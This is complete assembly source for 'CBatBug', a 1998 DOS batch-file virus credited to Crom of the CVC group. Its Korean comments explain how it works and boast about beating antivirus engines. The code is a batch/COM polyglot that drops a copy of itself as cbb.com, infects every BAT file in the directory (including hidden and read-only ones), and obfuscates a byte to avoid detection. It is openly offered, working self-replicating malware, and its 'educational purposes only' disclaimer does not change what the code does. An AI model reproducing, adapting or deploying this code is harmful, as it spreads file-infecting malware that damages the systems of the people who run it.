;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                            \\\\\\\  \       \   \\\\\\\
;     CBatBug                               \          \     \   \
;                 by Crom of CVC            \           \   \    \    98/05
;                                           \            \ \     \
;                                            \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : CBatBug (CVC Batch Bug)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/21
; Type       : Non memory resident BAT
;
;  !*< 법률적 의무 >********************************************************!
;   *                                                                        *
;   * 경고 !                                                                 *
;   *        이 정보는 교육적인 목적으로만 사용되어야 합니다. 우리는 이      *
;   *        정보를 사용해서 발생하는 어떤 문제에 대해서도 책임을 지지 않    *
;   *        습니다. 모든 책임은 글을 읽는 사람에게 있습니다.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; 한국에서 제작된 바이러스중 배치 파일을 감염 시키는 최초의 바이러스이다 !
; 이 바이러스에 대한 자세한 설명은 CVC #04 에 존재한다. 이해를 위해서는 읽어 보
; 기 바란다.
;
; 지금까지 배치 파일 감염 바이러스가 불가능 했다고 생각하면 그 생각을 버려라.
;
; 바이러스에 감염된 BAT 파일이 실행되면 COM 파일을 생성하고 그 파일을 실행시킨
; 다. 그 파일은 현재 디렉토리에 있는 모든 BAT 파일을 감염시킨다. 그리고, 정상적
; 인 배치 파일이 실행된다. 놀랍지 않는가 ?
;
; COM 이나 EXE 파일을 감염 시키는 바이러스와 혼합되면 강력해 질것 이다.
; 지금은 바이러스가 앞부분에 존재해 쉽게 치료 할 수 있으나 곧 후위형 배치 파일
; 감염 바이러스를 선보일 생각이다. 그럼, AV 제작자들의 엔진 수정은 불가피 하다
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


            .MODEL  TINY
            .CODE

            org   100h

 Bat_Vir:
            db    '::'                      ; BATCH 파일이라면 이부분은 무시
            jmp   Start                     ; 된다. (레이블로 인식된다.)
            db    0Dh,0Ah                   ;

            db    'copy  %0 cbb.com > NUL',0Dh,0Ah ; 123.COM 파일 생성
            db    'cbb',0Dh,0Ah             ; 바이러스 실행
            db    'goto Start!',0Dh,0Ah     ; 원래 배치 파일 실행
;
;  위의 코드 내용은 다음과 같다. COM 파일로 실행되더라도 CMP BH,[BP+SI] 는 실
;  행에 전혀 문제 되지 않는것이다.
;  0100 3A3A          CMP     BH,[BP+SI]
;  0102 EB2F          JMP     0133
;  0104 90            NOP
;  0105 0D0A63        OR      AX,630A
;
; 1. 배치 파일로 실행된다면 현재 배치 파일을 123.COM 으로 실행하고 OrgBatch
;    레이블로 점프한다.
;
; 2. COM 파일로 실행된다면 일반 COM 파일 형식으로 실행된다. '::' 는 의미 없는
;    명령이다. 그리고, 바로 점프 명령으로 Start 로 간다. 이 모든 행동이 가능
;    하게 해준 인텔 측에 감사드린다 !
;

 Start:
            mov   ah, 2Fh                   ; DTA 구하기
            int   21h
            push  es                        ; DTA 값 저장
            push  bx

;
; 1Ah 를 암호화 시키지 않으면 안된다. 1Ah 는 텍스트 파일에서는 EOF (End Of File)
; 이다. 처음에 계속 감염된 BAT 파일을 실행해도 레이블을 찾을 수 없다고 나와서
; 왜 인지 몰랐는데 나중에 알고 보니 1Ah 때문에 1Ah 이후의 내용이 메모리에 존재
; 하지 않았다. 1Ah 는 꼭 암호화 시키자
;
;
            mov   ah, (1Ah xor 15h)         ; 새로운 DTA 설정
            mov   dx, offset NewDTA
            xor   ah, 15h
            int   21h

            mov   ah, 4Eh                   ; BAT 파일 찾기
            mov   cx, 00100011B             ; 읽기전용/숨김파일
            mov   dx, offset Mask_BAT       ; *.BAT
 Find_repeat:
            int   21h                       ;
            jc    Terminate                 ; 에러면 종료

 Infect_BAT:

            mov   ax, 3D02h                 ; 파일 오픈
            mov   dx, offset NewDTA[1Eh]    ;
            int   21h
            jc    Terminate

            xchg  ax,bx                     ; 핸들 얻기

            mov   ah, 3Fh                   ; 원래 BAT 길이만큼 읽어 들이기
            mov   cx, word ptr NewDTA[26]   ; 길이
            mov   dx, offset Buffer         ; 버퍼
            int   21h

            mov   ax,4200h                  ; 파일을 읽어 들였으므로 포인터가
            xor   cx,cx                     ; 이동했으므로 다시 처음으로 이동
            xor   dx,dx                     ; 시킨다.
            int   21h

            cmp   word ptr Buffer, '::'     ; 감염 여부 검사
            jnz   Write_vir
            cmp   byte ptr Buffer+2, 0EBh
            jz    Infected

 Write_vir:
            mov   ah,  40h                  ; 바이러스 쓰기
            mov   cx, offset End_Virus - 100h
            add   cx, word ptr NewDta[26]   ; 쓸 길이 = 바이러스 + 원래 BAT
            mov   dx, 100h                  ; 버퍼
            int   21h

 Infected:
            mov   ah, 3eh                  ; 파일 닫기
            int   21h

            mov   ah, 4Fh                  ; 다음 BAT 파일 찾기
            jmp   Find_repeat

 Terminate:
            pop   dx
            pop   ds
            mov   ah, (1Ah xor 15h)        ; DTA 재 설정
            xor   ah, 15h
            int   21h

            mov   ax,4c00h                 ; 종료
            int   21h

            db    '[CBatBug]'
            db    '(c) Copyleft 1997-1998 by Crom/CVC,Corea'

 Mask_BAT   db    '*.BAT',0                ; BAT 파일 찾기
 NewDTA     db    30h dup (?)
            db    0Dh,0Ah,':Start!',0Dh,0Ah
            db    0Dh,0Ah,'del cbb.com > nul',0Dh,0Ah
 End_Virus:
 Buffer:                                   ;

            END   Bat_Vir

